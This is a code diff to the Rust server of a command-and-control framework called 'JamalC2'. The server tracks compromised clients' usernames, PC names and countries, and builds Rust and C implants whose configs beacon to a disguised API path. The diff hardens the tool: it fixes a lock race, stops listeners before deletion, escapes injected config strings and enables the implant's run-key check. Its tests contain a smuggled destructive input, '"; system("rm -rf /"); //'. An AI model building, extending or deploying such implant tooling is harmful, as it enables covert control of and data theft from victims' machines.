@@ -102,46 +102,47 @@ pub fn create_api_routes() -> Router<SharedState> {
 async fn get_clients(State(state): State<SharedState>) -> Json<Vec<ClientInfo>> {
     let now = Utc::now();
     
-    // 清理超时客户端
-    let timeout_ids: Vec<String> = state.clients.read()
-        .iter()
-        .filter_map(|(id, c)| {
-            let calculated = c.beacon_interval * 3 + 30;
-            let timeout_seconds = std::cmp::max(calculated, 120) as i64;
-            let elapsed = now.signed_duration_since(c.last_seen).num_seconds();
-            if elapsed > timeout_seconds {
-                Some(id.clone())
-            } else {
-                None
-            }
-        })
-        .collect();
-    
-    if !timeout_ids.is_empty() {
-        let mut clients = state.clients.write();
+    // 使用单次 write 锁同时清理超时客户端并收集列表，避免读写锁竞态
+    let clients: Vec<ClientInfo> = {
+        let mut clients_map = state.clients.write();
+        
+        // 清理超时客户端
+        let timeout_ids: Vec<String> = clients_map.iter()
+            .filter_map(|(id, c)| {
+                let calculated = c.beacon_interval * 3 + 30;
+                let timeout_seconds = std::cmp::max(calculated, 120) as i64;
+                let elapsed = now.signed_duration_since(c.last_seen).num_seconds();
+                if elapsed > timeout_seconds {
+                    Some(id.clone())
+                } else {
+                    None
+                }
+            })
+            .collect();
+        
         for id in &timeout_ids {
-            clients.remove(id);
+            clients_map.remove(id);
             println!("[*] Client {} timed out and removed", id);
         }
-    }
-    
-    let clients: Vec<ClientInfo> = state.get_clients()
-        .into_iter()
-        .map(|c| ClientInfo {
-            id: c.id,
-            ip_address: c.ip_address,
-            version: c.version,
-            operating_system: c.operating_system,
-            account_type: c.account_type,
-            country: c.country,
-            username: c.username,
-            pc_name: c.pc_name,
-            tag: c.tag,
-            connected_at: c.connected_at.to_rfc3339(),
-            last_seen: c.last_seen.to_rfc3339(),
-            beacon_interval: c.beacon_interval,
-        })
-        .collect();
+        
+        // 收集客户端列表
+        clients_map.values()
+            .map(|c| ClientInfo {
+                id: c.id.clone(),
+                ip_address: c.ip_address.clone(),
+                version: c.version.clone(),
+                operating_system: c.operating_system.clone(),
+                account_type: c.account_type.clone(),
+                country: c.country.clone(),
+                username: c.username.clone(),
+                pc_name: c.pc_name.clone(),
+                tag: c.tag.clone(),
+                connected_at: c.connected_at.to_rfc3339(),
+                last_seen: c.last_seen.to_rfc3339(),
+                beacon_interval: c.beacon_interval,
+            })
+            .collect()
+    };
     
     Json(clients)
 }
@@ -285,6 +286,11 @@ async fn delete_listener(
     State(state): State<SharedState>,
     Path(listener_id): Path<String>,
 ) -> impl IntoResponse {
+    // 如果监听器正在运行，先停止它
+    if let Some(shutdown_tx) = state.listener_shutdown.write().remove(&listener_id) {
+        let _ = shutdown_tx.send(());
+        println!("[*] Stopped running listener {} before deletion", listener_id);
+    }
     state.delete_listener(&listener_id);
     StatusCode::OK
 }
@@ -641,7 +647,7 @@ async fn build_rust_implant(
             let output_dir = std::path::PathBuf::from("/tmp/jamalc2_builds");
             let _ = fs::create_dir_all(&output_dir);
             
-            let output_filename = format!("{}", request.output_name);
+            let output_filename = request.output_name.clone();
             let output_path = output_dir.join(&output_filename);
             
             if let Err(e) = fs::copy(&built_binary, &output_path) {
@@ -735,8 +741,17 @@ fn find_implant_dir() -> Option<std::path::PathBuf> {
     None
 }
 
+/// 对字符串进行转义，防止 Rust 字符串字面量注入
+fn sanitize_rust_string(input: &str) -> String {
+    input.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r")
+}
+
 /// 生成 Rust 配置文件
 fn generate_rust_config(request: &BuildRequest) -> String {
+    let host = sanitize_rust_string(&request.server_host);
+    let tag = sanitize_rust_string(&request.tag);
+    let key = sanitize_rust_string(&request.encryption_key);
+    
     format!(r#"//! Implant 配置
 //! 这些值会在生成时被 Builder 修改
 
@@ -779,7 +794,7 @@ pub fn get_server_port() -> u16 {{ SERVER_PORT }}
 pub fn get_use_tls() -> bool {{ USE_TLS }}
 pub fn get_tag() -> &'static str {{ TAG }}
 pub fn get_encryption_key() -> &'static str {{ ENCRYPTION_KEY }}
-"#, request.server_host, request.server_port, request.use_tls, request.tag, request.encryption_key)
+"#, host, request.server_port, request.use_tls, tag, key)
 }
 
 /// 递归复制目录
@@ -831,9 +846,18 @@ fn find_implant_c_dir() -> Option<std::path::PathBuf> {
     None
 }
 
+/// 对字符串进行转义，防止 C 字符串字面量注入
+fn sanitize_c_string(input: &str) -> String {
+    input.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r")
+}
+
 /// 生成 C 配置文件 (config.h)
 fn generate_c_config(request: &BuildRequest) -> String {
     let use_tls = if request.use_tls { 1 } else { 0 };
+    let host = sanitize_c_string(&request.server_host);
+    let tag = sanitize_c_string(&request.tag);
+    let key = sanitize_c_string(&request.encryption_key);
+    
     format!(r#"/*
  * JamalC2 Implant - Configuration Header
  * This file is auto-generated by the Builder
@@ -862,7 +886,7 @@ fn generate_c_config(request: &BuildRequest) -> String {
 
 // Run Key (for execution validation)
 #define RUN_KEY "321"
-#define SKIP_KEY_CHECK 1
+#define SKIP_KEY_CHECK 0
 
 // API Paths (all requests go to same endpoint, type is in encrypted payload)
 #define API_CHECKIN "/api/CpHDCPSvc"
@@ -885,7 +909,7 @@ fn generate_c_config(request: &BuildRequest) -> String {
 #endif
 
 #endif // CONFIG_H
-"#, request.server_host, request.server_port, use_tls, request.tag, request.encryption_key)
+"#, host, request.server_port, use_tls, tag, key)
 }
 
 /// 编译 C Implant (使用 MinGW-w64 交叉编译)
@@ -1066,3 +1090,110 @@ async fn build_c_implant_cross(request: BuildRequest) -> Json<BuildResult> {
     }
 }
 
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_sanitize_rust_string_normal() {
+        assert_eq!(sanitize_rust_string("hello"), "hello");
+        assert_eq!(sanitize_rust_string("192.168.1.1"), "192.168.1.1");
+    }
+
+    #[test]
+    fn test_sanitize_rust_string_escapes() {
+        assert_eq!(sanitize_rust_string(r#"a"b"#), r#"a\"b"#);
+        assert_eq!(sanitize_rust_string("a\\b"), "a\\\\b");
+        assert_eq!(sanitize_rust_string("a\nb"), "a\\nb");
+        assert_eq!(sanitize_rust_string("a\rb"), "a\\rb");
+    }
+
+    #[test]
+    fn test_sanitize_rust_string_injection() {
+        // 尝试注入 Rust 代码
+        let evil = r#""; std::process::exit(1); //"#;
+        let sanitized = sanitize_rust_string(evil);
+        // 转义后引号前应有反斜杠
+        assert!(sanitized.starts_with("\\\""));
+        // 不应包含未转义的独立引号（不以反斜杠开头的 ")
+        assert!(!sanitized.contains(r#"" "#));  // 转义后不会有 " 后跟空格的模式
+    }
+
+    #[test]
+    fn test_sanitize_c_string_normal() {
+        assert_eq!(sanitize_c_string("hello"), "hello");
+        assert_eq!(sanitize_c_string("10.0.0.1"), "10.0.0.1");
+    }
+
+    #[test]
+    fn test_sanitize_c_string_escapes() {
+        assert_eq!(sanitize_c_string(r#"a"b"#), r#"a\"b"#);
+        assert_eq!(sanitize_c_string("a\\b"), "a\\\\b");
+    }
+
+    #[test]
+    fn test_generate_rust_config_contains_values() {
+        let req = BuildRequest {
+            server_host: "10.0.0.1".to_string(),
+            server_port: 8443,
+            use_tls: true,
+            tag: "test-tag".to_string(),
+            output_name: "test".to_string(),
+            encryption_key: "a".repeat(64),
+            implant_type: "rust".to_string(),
+        };
+        let config = generate_rust_config(&req);
+        
+        assert!(config.contains("10.0.0.1"));
+        assert!(config.contains("8443"));
+        assert!(config.contains("true"));
+        assert!(config.contains("test-tag"));
+        assert!(config.contains(&"a".repeat(64)));
+    }
+
+    #[test]
+    fn test_generate_c_config_contains_values() {
+        let req = BuildRequest {
+            server_host: "192.168.1.100".to_string(),
+            server_port: 4444,
+            use_tls: false,
+            tag: "c-implant".to_string(),
+            output_name: "test.exe".to_string(),
+            encryption_key: "b".repeat(64),
+            implant_type: "c".to_string(),
+        };
+        let config = generate_c_config(&req);
+        
+        assert!(config.contains("192.168.1.100"));
+        assert!(config.contains("4444"));
+        assert!(config.contains("USE_TLS 0"));
+        assert!(config.contains("c-implant"));
+    }
+
+    #[test]
+    fn test_generate_config_with_malicious_input() {
+        let req = BuildRequest {
+            server_host: r#""; system("rm -rf /"); //"#.to_string(),
+            server_port: 4444,
+            use_tls: false,
+            tag: "normal".to_string(),
+            output_name: "test".to_string(),
+            encryption_key: "c".repeat(64),
+            implant_type: "rust".to_string(),
+        };
+        
+        let rust_config = generate_rust_config(&req);
+        // 转义后不应包含未转义的引号+分号组合
+        // 实际转义结果：\"; system(\"rm -rf /\"); //
+        // 作为字符串字面量不会截断
+        assert!(!rust_config.contains(r#"system("rm"#));  // 确保没有未转义的嵌套引号
+        
+        let c_config = generate_c_config(&req);
+        assert!(!c_config.contains(r#"system("rm"#));
+    }
+
+    #[test]
+    fn test_default_implant_type() {
+        assert_eq!(default_implant_type(), "rust");
+    }
+}
